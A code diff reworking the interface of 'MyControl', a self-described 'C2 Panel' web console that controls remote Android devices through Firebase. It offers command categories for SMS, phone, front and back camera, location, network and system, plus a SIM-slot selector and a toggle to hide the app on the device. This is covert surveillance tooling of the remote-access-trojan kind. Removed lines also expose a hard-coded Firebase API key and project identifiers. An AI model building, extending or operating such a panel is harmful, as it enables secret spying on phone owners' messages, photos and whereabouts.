@@ -142,476 +142,466 @@
         .device-card .dc-status { font-size: 12px; font-weight: 600; }
         .device-card .dc-status.online { color: #34d399; }
         .device-card .dc-status.offline { color: #6b7280; }
-        .device-card .dc-name { font-size: 15px; font-weight: 600; margin-bottom: 6px; }
+        .device-card .dc-name { font-size: 16px; font-weight: 700; margin-bottom: 6px; }
         .device-card .dc-meta {
-            display: flex; gap: 12px; font-size: 12px; color: #6b7280; flex-wrap: wrap;
+            display: flex; gap: 14px; font-size: 12px; color: #6b7280;
         }
         .device-card .dc-enter {
-            margin-top: 12px; font-size: 10px; text-transform: uppercase;
-            letter-spacing: 0.5px; color: #6c5ce7; font-weight: 600;
+            font-size: 11px; color: #6c5ce7; margin-top: 10px;
+            font-weight: 600; opacity: 0.6;
         }
         .device-card .dc-del-hint {
-            font-size: 9px; color: #4a4f5f; margin-top: 3px;
-        }
-        .device-card .dc-last-ping {
-            font-size: 9px; color: #5a6070; margin-top: 2px;
+            font-size: 10px; color: #4b5563; margin-top: 2px;
         }
 
-        .empty-state {
-            text-align: center; padding: 60px 20px;
-            background: #101218; border: 1px solid #1e2230;
-            border-radius: 16px;
-        }
-        .empty-state .big-icon { font-size: 48px; margin-bottom: 16px; }
-        .empty-state h3 { font-size: 18px; font-weight: 600; margin-bottom: 6px; }
-        .empty-state p { color: #6b7280; font-size: 13px; max-width: 400px; margin: 0 auto; }
-        .empty-state p.sub { font-size: 12px; color: #5a6070; margin-top: 4px; }
-
-        .cmd-grid {
-            display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
-            gap: 10px;
-        }
-        .cmd-card {
-            background: #101218; border: 1px solid #1e2230;
-            border-radius: 12px; padding: 18px 14px;
-            text-align: center; cursor: pointer; position: relative;
-            transition: all 0.2s;
-        }
-        .cmd-card:hover { border-color: #6c5ce766; background: #15192a; transform: translateY(-2px); }
-        .cmd-card .cmd-icon { font-size: 26px; margin-bottom: 6px; }
-        .cmd-card .cmd-name { font-size: 12px; font-weight: 600; color: #c4c9d6; }
-        .cmd-card .cmd-dot {
-            position: absolute; top: 8px; right: 8px;
-            width: 6px; height: 6px; border-radius: 50%;
-            background: transparent;
-        }
-        .cmd-card .cmd-dot.has-params { background: #fbbf24; box-shadow: 0 0 6px #fbbf2444; }
-        .section-title {
-            display: flex; align-items: center; gap: 10px; margin-bottom: 16px;
-        }
-        .section-title h3 { font-size: 15px; font-weight: 600; }
-        .section-title .badge {
-            background: #1e2230; padding: 2px 10px; border-radius: 10px;
-            font-size: 11px; color: #9ba1b2;
-        }
-
-        .result-item {
-            background: #101218; border: 1px solid #1e2230;
-            border-radius: 10px; padding: 12px 16px; margin-bottom: 8px;
-        }
-        .result-item .ri-top {
-            display: flex; align-items: center; gap: 10px; margin-bottom: 6px;
-        }
-        .result-item .ri-action { font-weight: 600; font-size: 13px; flex: 1; }
-        .result-item .ri-status {
-            font-size: 10px; text-transform: uppercase; letter-spacing: 0.5px;
-            padding: 2px 8px; border-radius: 6px; font-weight: 700;
-        }
-        .result-item .ri-status.sending { background: #1e3a5f22; color: #60a5fa; animation: pulse 2s infinite; }
-        .result-item .ri-status.sent { background: #1e2230; color: #9ba1b2; }
-        .result-item .ri-status.pending { background: #1e3a5f22; color: #60a5fa; animation: pulse 2s infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-        .result-item .ri-status.ok { background: #065f4622; color: #34d399; }
-        .result-item .ri-status.error { background: #7f1d1d22; color: #f87171; }
-        .result-item .ri-status.write_fail { background: #7f1d1d22; color: #fb923c; }
-        .result-item .ri-time { font-size: 11px; color: #6b7280; }
-        .result-item .ri-output {
-            font-family: 'SF Mono', 'Fira Code', monospace;
-            font-size: 12px; color: #9ba1b2; word-break: break-word;
-        }
-        .results-header {
-            display: flex; align-items: center; justify-content: space-between;
-            margin: 16px 0 10px;
-        }
-        .results-header span { font-size: 12px; color: #6b7280; }
-        .empty { color: #6b7280; font-size: 13px; text-align: center; padding: 24px; }
-
-        .context-menu {
-            position: fixed; z-index: 9999;
-            background: #161b2b; border: 1px solid #262b3a;
-            border-radius: 10px; padding: 4px; min-width: 200px;
-            display: none; box-shadow: 0 15px 40px rgba(0,0,0,0.6);
-        }
-        .context-menu.open { display: block; }
-        .context-menu .cm-item {
-            padding: 8px 14px; border-radius: 6px; font-size: 13px;
-            cursor: pointer; display: flex; align-items: center; gap: 8px;
-            color: #e4e7ed; transition: background 0.15s;
-        }
-        .context-menu .cm-item:hover { background: #1f2540; }
-        .context-menu .cm-item.danger { color: #f87171; }
-        .context-menu .cm-item .cm-icon { width: 18px; text-align: center; }
-
-        .modal-overlay {
-            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.6); backdrop-filter: blur(4px);
-            z-index: 10000; display: none; align-items: center; justify-content: center;
-        }
-        .modal-overlay.open { display: flex; }
-        .modal-box {
-            background: #13182a; border: 1px solid #1e2230;
-            border-radius: 16px; padding: 28px; width: 90%; max-width: 460px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
-        }
-        .modal-box h3 { font-size: 17px; margin-bottom: 4px; }
-        .modal-box p { font-size: 13px; color: #6b7280; margin-bottom: 16px; }
-        .modal-box label { font-size: 12px; display: block; margin-top: 10px; color: #9ba1b2; }
-        .modal-box input, .modal-box textarea, .modal-box select {
-            width: 100%; padding: 9px 12px; border-radius: 8px;
-            background: #0b0d12; border: 1px solid #1e2230;
-            color: #e4e7ed; font-size: 13px; font-family: inherit; margin-top: 4px;
-        }
-        .modal-box input:focus, .modal-box select:focus { outline: 2px solid #6c5ce766; border-color: transparent; }
-        .modal-box select {
-            appearance: none;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%239ba1b2' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
-            background-repeat: no-repeat;
-            background-position: right 10px center;
-            padding-right: 30px;
-            cursor: pointer;
-        }
-        .modal-box select option {
-            background: #13182a;
-            color: #e4e7ed;
-        }
-        .modal-buttons { display: flex; gap: 10px; margin-top: 18px; justify-content: flex-end; }
-        .modal-buttons .btn { font-size: 12px; padding: 7px 16px; }
-
-        .settings-group { margin: 12px 0; }
-        .settings-group label { font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; color: #5a6070; display: block; margin-top: 12px; font-weight: 600; }
-        .settings-group input { width: 100%; padding: 8px 12px; border-radius: 6px; background: #0b0d12; border: 1px solid #1e2230; color: #e4e7ed; font-size: 12px; font-family: 'SF Mono', monospace; margin-top: 3px; }
-        .settings-group .hint { font-size: 10px; color: #5a6070; margin-top: 3px; }
-
-        .diagnostic-box {
-            display: none; background: #06080d; border: 1px solid #1a1e2c;
-            border-radius: 8px; padding: 14px; margin-top: 16px;
-            font-family: 'SF Mono', 'Fira Code', monospace; font-size: 11px;
-            color: #8b92a8; max-height: 200px; overflow-y: auto;
-            white-space: pre-wrap; line-height: 1.6;
-        }
-
-        .toast-container {
-            position: fixed; bottom: 20px; right: 20px; z-index: 99999;
-            display: flex; flex-direction: column; gap: 8px;
-        }
-        .toast {
-            padding: 10px 18px; border-radius: 8px; font-size: 13px; font-weight: 500;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.3); max-width: 320px;
-            animation: slideIn 0.25s ease;
-        }
-        .toast.success { background: #065f46; color: #d1fae5; }
-        .toast.error { background: #7f1d1d; color: #fecaca; }
-        .toast.info { background: #1e3a5f; color: #bfdbfe; }
-        @keyframes slideIn { from { transform: translateX(30px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+        .empty-state { text-align: center; padding: 60px 20px; }
+        .empty-state .big-icon { font-size: 48px; margin-bottom: 12px; }
+        .empty-state h3 { font-size: 18px; margin-bottom: 6px; }
+        .empty-state p { color: #6b7280; font-size: 13px; }
+        .empty-state .sub { font-size: 12px; color: #4b5563; margin-top: 4px; }
+        .empty-state code { background: #1b1f2e; padding: 2px 6px; border-radius: 4px; font-size: 12px; }
 
         .loading-spinner {
-            display: inline-block; width: 18px; height: 18px;
+            display: inline-block; width: 20px; height: 20px;
             border: 2px solid #2d3143; border-top-color: #6c5ce7;
             border-radius: 50%; animation: spin 0.7s linear infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        .retry-btn {
-            font-size: 10px; background: transparent; border: 1px solid #fb923c44;
-            color: #fb923c; padding: 2px 8px; border-radius: 4px;
-            cursor: pointer; margin-left: 6px;
+        /* ── CONTEXT MENU ── */
+        .context-menu {
+            position: fixed; background: #171a24; border: 1px solid #262b3a;
+            border-radius: 10px; padding: 6px; z-index: 9999;
+            min-width: 160px; display: none; box-shadow: 0 15px 40px rgba(0,0,0,0.6);
         }
-        .retry-btn:hover { background: #fb923c22; }
+        .context-menu.open { display: block; }
+        .context-menu .cm-item {
+            padding: 9px 14px; border-radius: 6px; font-size: 13px;
+            cursor: pointer; color: #e4e7ed; transition: background 0.15s;
+            display: flex; align-items: center; gap: 9px;
+        }
+        .context-menu .cm-item:hover { background: #1e2230; }
+        .context-menu .cm-item.danger { color: #f87171; }
 
+        /* ── MODAL ── */
+        .modal-overlay {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.65);
+            display: none; align-items: center; justify-content: center;
+            z-index: 10000; backdrop-filter: blur(2px);
+        }
+        .modal-overlay.open { display: flex; }
+        .modal-box {
+            background: #171a24; border: 1px solid #262b3a;
+            border-radius: 16px; padding: 28px; max-width: 440px;
+            width: 90%; box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+        }
+        .modal-box h3 { font-size: 18px; margin-bottom: 4px; }
+        .modal-box .modal-sub { font-size: 12px; color: #6b7280; margin-bottom: 18px; }
+        .modal-box label { display: block; font-size: 12px; color: #9ba1b2; margin-bottom: 4px; margin-top: 12px; font-weight: 500; }
+        .modal-box input, .modal-box select {
+            width: 100%; padding: 10px 14px; border-radius: 8px; border: 1px solid #262b3a;
+            background: #101218; color: #e4e7ed; font-size: 13px; font-family: inherit; outline: none;
+        }
+        .modal-box input:focus, .modal-box select:focus { border-color: #6c5ce7; }
+        .modal-box .modal-actions { display: flex; gap: 8px; justify-content: flex-end; margin-top: 20px; }
+        .modal-box select { appearance: auto; }
+
+        /* ── COMMAND CENTER ── */
+        .cmd-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 10px;
+        }
+        .cmd-card {
+            background: #101218; border: 1px solid #1e2230;
+            border-radius: 12px; padding: 16px 12px; cursor: pointer;
+            transition: all 0.2s; text-align: center; position: relative;
+        }
+        .cmd-card:hover {
+            border-color: #6c5ce7; background: #151928;
+            transform: translateY(-2px);
+        }
+        .cmd-card .cmd-dot {
+            position: absolute; top: 8px; right: 8px;
+            width: 8px; height: 8px; border-radius: 50%;
+            background: transparent;
+        }
+        .cmd-card .cmd-dot.has-params { background: #fbbf24; }
+        .cmd-card .cmd-icon { font-size: 24px; margin-bottom: 6px; }
+        .cmd-card .cmd-name { font-size: 12px; font-weight: 600; color: #d1d5db; }
+
+        .section-title {
+            display: flex; align-items: center; gap: 10px;
+            margin-bottom: 12px; margin-top: 4px;
+        }
+        .section-title h3 { font-size: 15px; font-weight: 600; }
+        .section-title .badge {
+            font-size: 11px; background: #1e2230; color: #9ba1b2;
+            padding: 2px 9px; border-radius: 12px;
+        }
+
+        .results-header {
+            display: flex; align-items: center; justify-content: space-between;
+            margin-top: 24px; margin-bottom: 10px; flex-wrap: wrap; gap: 8px;
+        }
+        .results-header h3 { font-size: 15px; font-weight: 600; }
+        .results-header .res-meta { font-size: 12px; color: #6b7280; }
+
+        .results-body .result-item {
+            background: #101218; border: 1px solid #1e2230;
+            border-radius: 10px; padding: 14px 16px; margin-bottom: 8px;
+        }
+        .result-item .ri-top {
+            display: flex; align-items: center; gap: 10px;
+            flex-wrap: wrap;
+        }
+        .result-item .ri-action { font-weight: 600; font-size: 13px; flex: 1; }
+        .result-item .ri-status {
+            font-size: 11px; font-weight: 700; padding: 3px 9px;
+            border-radius: 20px; text-transform: uppercase;
+        }
+        .result-item .ri-status.sending { background: #6c5ce722; color: #a78bfa; }
+        .result-item .ri-status.sent { background: #f59e0b22; color: #fbbf24; }
+        .result-item .ri-status.pending { background: #f59e0b22; color: #fbbf24; }
+        .result-item .ri-status.ok { background: #34d39922; color: #34d399; }
+        .result-item .ri-status.error { background: #ef444422; color: #f87171; }
+        .result-item .ri-status.write_fail { background: #ef444422; color: #f87171; }
+        .result-item .ri-time { font-size: 11px; color: #6b7280; }
+        .result-item .ri-output { font-size: 13px; color: #9ba1b2; margin-top: 6px; padding-top: 6px; border-top: 1px solid #1e2230; font-family: 'SF Mono', 'Fira Code', monospace; word-break: break-all; }
+        .result-item .retry-btn {
+            background: transparent; border: 1px solid #6c5ce7; color: #a78bfa;
+            padding: 2px 10px; border-radius: 6px; font-size: 11px; cursor: pointer;
+        }
+        .result-item .retry-btn:hover { background: #6c5ce722; }
+
+        .results-body .empty {
+            text-align: center; padding: 30px; color: #6b7280; font-size: 13px;
+        }
+
+        /* ── DIAG TOAST ── */
+        .toast-container {
+            position: fixed; bottom: 20px; right: 20px; z-index: 99999;
+            display: flex; flex-direction: column; gap: 8px; pointer-events: none;
+        }
+        .toast {
+            padding: 12px 20px; border-radius: 10px; font-size: 13px;
+            font-weight: 500; pointer-events: auto;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.5);
+            max-width: 380px; word-break: break-word;
+        }
+        .toast.info { background: #1e3a5f; color: #93c5fd; border: 1px solid #2563eb44; }
+        .toast.success { background: #064e3b; color: #6ee7b7; border: 1px solid #10b98144; }
+        .toast.error { background: #4c0519; color: #fca5a5; border: 1px solid #ef444444; }
+        .toast.warning { background: #4a3a00; color: #fde68a; border: 1px solid #f59e0b44; }
+
+        /* ── DIAGNOSTIC PANEL ── */
+        .diag-panel {
+            position: fixed; bottom: 20px; left: 260px; right: 20px;
+            background: #101218ee; border: 1px solid #1e2230; border-radius: 10px;
+            padding: 12px 16px; font-size: 11px; font-family: 'SF Mono', monospace;
+            color: #6b7280; max-height: 80px; overflow-y: auto;
+            backdrop-filter: blur(6px); z-index: 9990;
+            display: none; line-height: 1.5;
+        }
+        .diag-panel.open { display: block; }
+        .diag-panel .diag-line { opacity: 0.8; }
+        .diag-panel .diag-line:nth-child(1) { opacity: 1; color: #9ba1b2; }
+
+        /* ── RESPONSIVE ── */
         @media (max-width: 768px) {
             .sidebar { display: none; }
             .main { padding: 16px; }
             .device-grid { grid-template-columns: 1fr; }
             .cmd-grid { grid-template-columns: repeat(2, 1fr); }
             .status-bar { flex-direction: column; }
+            .topbar { flex-direction: column; align-items: flex-start; }
+            .diag-panel { left: 10px; right: 10px; max-height: 100px; }
         }
     </style>
 </head>
 <body>
 
-    <div class="app-shell">
+<div class="app-shell">
 
-        <aside class="sidebar">
-            <div class="sidebar-header">
-                <div class="logo">MC</div>
-                <h1>MyControl</h1>
-            </div>
-            <nav class="sidebar-nav">
-                <div class="nav-label">Main</div>
-                <a class="active" onclick="showView('dashboard')">
-                    <span class="icon">▣</span> Dashboard
-                </a>
-                <a onclick="showView('command')">
-                    <span class="icon">⌘</span> Command Center
-                </a>
-                <div class="nav-label" style="margin-top:16px;">Status</div>
-                <div style="padding:8px 12px;font-size:12px;color:#5a6070;">
-                    <div id="sidebarStatus" style="display:flex;align-items:center;gap:6px;">
-                        <span class="loading-spinner" style="width:10px;height:10px;border-width:1.5px;"></span> connecting…
-                    </div>
-                    <div id="sidebarAuth" style="margin-top:4px;font-size:10px;word-break:break-all;"></div>
-                    <div id="sidebarDeviceCount" style="margin-top:4px;">Devices: —</div>
-                    <div id="sidebarPingStatus" style="margin-top:4px;font-size:10px;color:#5a6070;"></div>
-                </div>
-            </nav>
-            <div class="sidebar-footer">
-                <a onclick="openSettings()" style="cursor:pointer;color:#6b7280;display:flex;align-items:center;gap:6px;font-size:12px;">
-                    ⚙️ Config
-                </a>
-            </div>
-        </aside>
-
-        <div class="main">
-
-            <!-- ═══ DASHBOARD VIEW ═══ -->
-            <div id="viewDashboard" class="view active">
-                <div class="topbar">
-                    <div class="topbar-left">
-                        <h2>📡 Devices</h2>
-                        <p id="dashLastUpdated">Wait…</p>
-                    </div>
-                    <div class="topbar-right">
-                        <span id="dashFirebaseStatus" style="font-size:12px;display:flex;align-items:center;gap:5px;">
-                            <span class="loading-spinner" style="width:12px;height:12px;border-width:2px;"></span> authenticating
-                        </span>
-                        <button class="btn btn-ghost btn-sm" onclick="refreshDevices()">⟳ Refresh</button>
-                        <button class="btn btn-ghost btn-sm" onclick="openSettings()">⚙️</button>
-                    </div>
-                </div>
-
-                <div class="status-bar">
-                    <div class="status-card">
-                        <div class="label">Total Devices</div>
-                        <div class="value purple" id="dashTotalDevices">—</div>
-                    </div>
-                    <div class="status-card">
-                        <div class="label">Online</div>
-                        <div class="value green" id="dashOnlineDevices">—</div>
-                    </div>
-                    <div class="status-card">
-                        <div class="label">Ping Watch</div>
-                        <div class="value yellow" id="dashPingStatus">Idle</div>
-                    </div>
-                    <div class="status-card">
-                        <div class="label">Write Status</div>
-                        <div class="value green" id="dashWriteStatus">Ready</div>
-                    </div>
-                </div>
-
-                <div id="deviceListContainer">
-                    <div class="empty-state">
-                        <div class="big-icon"><span class="loading-spinner" style="width:40px;height:40px;border-width:3px;"></span></div>
-                        <h3>Initializing</h3>
-                        <p>Connecting to Firebase and loading devices…</p>
-                    </div>
-                </div>
-
-                <div class="diagnostic-box" id="diagnosticBox"></div>
-            </div>
-
-            <!-- ═══ COMMAND CENTER VIEW ═══ -->
-            <div id="viewCommand" class="view">
-                <div class="topbar">
-                    <div class="topbar-left">
-                        <h2>⌘ Command Center</h2>
-                        <p>Device: <span id="cmdDeviceDisplay" style="font-family:monospace;">—</span></p>
-                    </div>
-                    <div class="topbar-right">
-                        <button class="btn btn-ghost btn-sm" onclick="showView('dashboard')">← Back</button>
-                        <button class="btn btn-ghost btn-sm" onclick="clearCmdResults()">Clear</button>
-                        <button class="btn btn-ghost btn-sm" onclick="retryLastFailedCmd()">↻ Retry Failed</button>
-                        <button class="btn btn-ghost btn-sm" onclick="refreshPendingResults()">⟳ Load Pending</button>
-                    </div>
-                </div>
-
-                <div class="status-bar">
-                    <div class="status-card">
-                        <div class="label">Commands Sent</div>
-                        <div class="value purple" id="cmdCountDisplay">0</div>
-                    </div>
-                    <div class="status-card">
-                        <div class="label">Last Status</div>
-                        <div class="value green" id="cmdLastStatus">Ready</div>
-                    </div>
-                    <div class="status-card" style="flex:2;">
-                        <div class="label">Results</div>
-                        <div style="margin-top:5px;font-size:13px;color:#6b7280;" id="cmdResultCount">0 results</div>
-                    </div>
-                </div>
-
-                <div id="commandGrid" style="margin-bottom:20px;">
-                    <div class="empty-state" style="padding:30px;">
-                        <p>Select a device from Dashboard to start commanding</p>
-                    </div>
-                </div>
-
-                <div class="results-header"><span>Command Log</span><span id="cmdResultCount2">0 results</span></div>
-                <div id="resultsBody">
-                    <div class="empty">Results appear here</div>
-                </div>
-            </div>
-
+    <!-- ─── SIDEBAR ─── -->
+    <aside class="sidebar">
+        <div class="sidebar-header">
+            <div class="logo">MC</div>
+            <h1>MyControl</h1>
         </div>
-    </div>
+        <nav class="sidebar-nav">
+            <div class="nav-label">Navigation</div>
+            <a class="active" onclick="showView('dashboard')">
+                <span class="icon">📊</span> Dashboard
+            </a>
+            <a onclick="showView('command')">
+                <span class="icon">⚡</span> Command Center
+            </a>
+            <div style="margin-top:20px;">
+                <div class="nav-label">Status</div>
+                <div style="padding:8px 12px;font-size:12px;color:#6b7280;">
+                    <div id="sidebarDeviceCount">Devices: —</div>
+                    <div style="margin-top:4px;display:flex;align-items:center;gap:6px;">
+                        <span class="loading-spinner" id="sidebarSpinner" style="width:12px;height:12px;border-width:1.5px;display:none;"></span>
+                        <span id="sidebarFwStatus">—</span>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <div class="sidebar-footer">
+            <div style="display:flex;gap:8px;flex-wrap:wrap;">
+                <button class="btn btn-ghost btn-sm" onclick="openSettings()" style="font-size:11px;">⚙️ Config</button>
+                <button class="btn btn-ghost btn-sm" onclick="toggleDiag()" style="font-size:11px;">📟 Diag</button>
+            </div>
+            <div style="margin-top:8px;">v1.0 · C2 Panel</div>
+        </div>
+    </aside>
 
-    <div class="context-menu" id="contextMenu">
-        <div class="cm-item" onclick="contextAction('enter')"><span class="cm-icon">⌘</span> Enter Command Center</div>
-        <div class="cm-item danger" onclick="contextAction('delete')"><span class="cm-icon">🗑️</span> Delete Device</div>
-    </div>
+    <!-- ─── MAIN CONTENT ─── -->
+    <main class="main">
 
-    <div class="modal-overlay" id="deleteModal">
-        <div class="modal-box">
-            <h3>🗑️ Delete Device</h3>
-            <p id="deleteModalInfo"></p>
-            <div class="modal-buttons">
-                <button class="btn btn-ghost" onclick="closeDeleteModal()">Cancel</button>
-                <button class="btn btn-danger" onclick="confirmDelete()">Delete</button>
+        <!-- ═══ DASHBOARD VIEW ═══ -->
+        <div class="view active" id="viewDashboard">
+            <div class="topbar">
+                <div class="topbar-left">
+                    <h2>📊 Dashboard</h2>
+                    <p id="dashLastUpdated">Loading devices…</p>
+                </div>
+                <div class="topbar-right">
+                    <button class="btn btn-ghost btn-sm" onclick="openSettings()">⚙️ Firebase Config</button>
+                    <button class="btn btn-primary btn-sm" onclick="refreshDevices()">⟳ Refresh</button>
+                </div>
+            </div>
+
+            <div class="status-bar">
+                <div class="status-card">
+                    <div class="label">Total Devices</div>
+                    <div class="value purple" id="dashTotalDevices">—</div>
+                </div>
+                <div class="status-card">
+                    <div class="label">Online Now</div>
+                    <div class="value green" id="dashOnlineDevices">—</div>
+                </div>
+                <div class="status-card">
+                    <div class="label">Connection</div>
+                    <div class="value" id="dashConnStatus" style="font-size:14px;">Initializing…</div>
+                </div>
+            </div>
+
+            <div id="deviceListContainer">
+                <div class="empty-state">
+                    <div class="big-icon"><span class="loading-spinner" style="width:40px;height:40px;border-width:3px;"></span></div>
+                    <h3>Loading devices…</h3>
+                    <p>Querying Firestore devices collection</p>
+                </div>
             </div>
         </div>
-    </div>
 
-    <div class="modal-overlay" id="paramModal">
-        <div class="modal-box">
-            <h3 id="modalTitle">Action</h3>
-            <p id="modalSub"></p>
-            <div id="modalFields"></div>
-            <div id="modalSimSelector" style="display:none;margin-top:12px;">
-                <label>📱 SIM Slot</label>
-                <select id="simSlotSelect">
-                    <option value="">-- Auto / Default SIM --</option>
-                    <option value="1">SIM 1</option>
-                    <option value="2">SIM 2</option>
-                </select>
-                <div id="simSlotInfo" style="font-size:10px;color:#5a6070;margin-top:3px;"></div>
+        <!-- ═══ COMMAND CENTER VIEW ═══ -->
+        <div class="view" id="viewCommand">
+            <div class="topbar">
+                <div class="topbar-left">
+                    <h2>⚡ Command Center</h2>
+                    <p>Device: <strong id="cmdDeviceDisplay">—</strong></p>
+                </div>
+                <div class="topbar-right">
+                    <span style="font-size:12px;color:#6b7280;">Sent: <strong id="cmdCountDisplay">0</strong></span>
+                    <span style="font-size:12px;color:#6b7280;">Status: <strong id="cmdLastStatus" class="value green" style="font-size:12px;">Ready</strong></span>
+                    <button class="btn btn-ghost btn-sm" onclick="refreshPendingResults()">⟳ Check Results</button>
+                    <button class="btn btn-ghost btn-sm" onclick="retryLastFailedCmd()">↻ Retry Failed</button>
+                    <button class="btn btn-danger btn-sm" onclick="clearCmdResults()">✕ Clear</button>
+                    <button class="btn btn-ghost btn-sm" onclick="showView('dashboard')">← Back</button>
+                </div>
             </div>
-            <div class="modal-buttons">
-                <button class="btn btn-ghost" onclick="closeParamModal()">Cancel</button>
-                <button class="btn btn-primary" onclick="executeFromModal()">Execute</button>
+
+            <div id="commandGrid">
+                <div class="empty-state"><h3>Select a category</h3></div>
+            </div>
+
+            <div class="results-header">
+                <h3>📋 Results</h3>
+                <span class="res-meta"><span id="cmdResultCount">0 results</span> · <span id="cmdResultCount2">0 results</span></span>
+            </div>
+            <div class="results-body" id="resultsBody">
+                <div class="empty">Select a device to start sending commands</div>
             </div>
         </div>
-    </div>
 
-    <div class="modal-overlay" id="settingsModal">
-        <div class="modal-box" style="max-width:500px;">
-            <h3>⚙️ Firebase Configuration</h3>
-            <p>Update these from Firebase Console → Project Settings → General → Your Web App</p>
-            <div class="settings-group">
-                <label>API Key</label>
-                <input id="cfg_apiKey" value="AIzaSyCbb-g6DhyCUjAcmglnkj-B3NLoI2KnL8o" />
-                <div class="hint">Web API key — NOT the Android key from google-services.json</div>
-            </div>
-            <div class="settings-group">
-                <label>Auth Domain</label>
-                <input id="cfg_authDomain" value="control-f5136.firebaseapp.com" />
-            </div>
-            <div class="settings-group">
-                <label>Project ID</label>
-                <input id="cfg_projectId" value="control-f5136" />
-            </div>
-            <div class="settings-group">
-                <label>Storage Bucket</label>
-                <input id="cfg_storageBucket" value="control-f5136.firebasestorage.app" />
-            </div>
-            <div class="settings-group">
-                <label>Messaging Sender ID</label>
-                <input id="cfg_messagingSenderId" value="204625008820" />
-            </div>
-            <div class="settings-group">
-                <label>App ID</label>
-                <input id="cfg_appId" value="1:204625008820:web:2802cd55ea8f327e6a9fe1" />
-            </div>
-            <div class="modal-buttons">
-                <button class="btn btn-ghost" onclick="closeSettings()">Cancel</button>
-                <button class="btn btn-primary" onclick="saveSettingsAndReconnect()">Save & Connect</button>
-            </div>
+    </main>
+</div>
+
+<!-- ─── CONTEXT MENU ─── -->
+<div class="context-menu" id="contextMenu">
+    <div class="cm-item" onclick="contextAction('enter')">⚡ Command Center</div>
+    <div class="cm-item danger" onclick="contextAction('delete')">🗑️ Delete Device</div>
+</div>
+
+<!-- ─── PARAM MODAL ─── -->
+<div class="modal-overlay" id="paramModal">
+    <div class="modal-box">
+        <h3 id="modalTitle">Command</h3>
+        <div class="modal-sub" id="modalSub">Configure parameters</div>
+        <div id="modalFields"></div>
+
+        <!-- SIM slot selector (hidden by default) -->
+        <div id="modalSimSelector" style="display:none;">
+            <label>SIM Slot</label>
+            <select id="simSlotSelect">
+                <option value="1">SIM 1</option>
+                <option value="2">SIM 2</option>
+            </select>
+        </div>
+
+        <!-- Flashlight on/off toggle (hidden by default) -->
+        <div id="modalToggleSelector" style="display:none;">
+            <label>Action</label>
+            <select id="toggleSelect"></select>
+        </div>
+
+        <!-- Camera front/back selector (hidden by default) -->
+        <div id="modalCameraSelector" style="display:none;">
+            <label>Camera</label>
+            <select id="cameraSelect">
+                <option value="back">Back Camera</option>
+                <option value="front">Front Camera</option>
+            </select>
+        </div>
+
+        <!-- Show/Hide selector (hidden by default) -->
+        <div id="modalHideShowSelector" style="display:none;">
+            <label>Action</label>
+            <select id="hideShowSelect">
+                <option value="hide">Hide App</option>
+                <option value="show">Show App</option>
+            </select>
+        </div>
+
+        <!-- Limit input (hidden by default) -->
+        <div id="modalLimitField" style="display:none;">
+            <label>Limit (number of results)</label>
+            <input type="number" id="limitInput" value="50" min="1" max="500" />
+        </div>
+
+        <div class="modal-actions">
+            <button class="btn btn-ghost btn-sm" onclick="closeParamModal()">Cancel</button>
+            <button class="btn btn-primary btn-sm" onclick="onModalConfirm()">Execute</button>
         </div>
     </div>
+</div>
 
-    <div class="toast-container" id="toastContainer"></div>
+<!-- ─── DELETE CONFIRM MODAL ─── -->
+<div class="modal-overlay" id="deleteModal">
+    <div class="modal-box">
+        <h3>🗑️ Delete Device</h3>
+        <div class="modal-sub" id="deleteModalInfo">Remove this device?</div>
+        <div class="modal-actions">
+            <button class="btn btn-ghost btn-sm" onclick="closeDeleteModal()">Cancel</button>
+            <button class="btn btn-danger btn-sm" onclick="confirmDelete()">Delete</button>
+        </div>
+    </div>
+</div>
+
+<!-- ─── SETTINGS MODAL ─── -->
+<div class="modal-overlay" id="settingsModal">
+    <div class="modal-box">
+        <h3>⚙️ Firebase Configuration</h3>
+        <div class="modal-sub">Stored in localStorage. Reloads after save.</div>
+        <label>API Key</label>
+        <input id="cfg_apiKey" placeholder="AIzaSy…" />
+        <label>Auth Domain</label>
+        <input id="cfg_authDomain" placeholder="project.firebaseapp.com" />
+        <label>Project ID</label>
+        <input id="cfg_projectId" placeholder="my-project" />
+        <label>Storage Bucket</label>
+        <input id="cfg_storageBucket" placeholder="project.appspot.com" />
+        <label>Messaging Sender ID</label>
+        <input id="cfg_messagingSenderId" placeholder="123456789" />
+        <label>App ID</label>
+        <input id="cfg_appId" placeholder="1:123:web:abc" />
+        <div class="modal-actions">
+            <button class="btn btn-ghost btn-sm" onclick="closeSettings()">Cancel</button>
+            <button class="btn btn-primary btn-sm" onclick="saveSettingsAndReconnect()">Save & Reload</button>
+        </div>
+    </div>
+</div>
+
+<!-- ─── TOAST CONTAINER ─── -->
+<div class="toast-container" id="toastContainer"></div>
+
+<!-- ─── DIAGNOSTIC PANEL ─── -->
+<div class="diag-panel" id="diagPanel">
+    <div class="diag-line">📟 Diagnostics ready</div>
+</div>
 
 <script>
     // ═══════════════════════════════════════════════════════
-    //  COMMAND CATALOG
+    //  COMMAND DEFINITIONS — FULLY SORTED & CONSOLIDATED
     // ═══════════════════════════════════════════════════════
+
     const CAT_NAMES = {
-        device: 'Device Control',
-        media: 'Media & Audio',
-        files: 'Files & Screenshot',
-        admin: 'Admin & Shell',
-        loc: 'Location & Sensors'
+        device: '📱 Device Control',
+        sms: '💬 SMS',
+        phone: '📞 Phone',
+        camera: '📸 Camera & Flashlight',
+        location: '📍 Location & Sensors',
+        system: '🔧 System',
+        network: '🌐 Network'
     };
 
     const COMMANDS = {
+        // ── DEVICE CONTROL ──
         device: [
-            { icon: '🔊', name: 'Vibrate', action: 'vibrate', params: { duration: '5000' } },
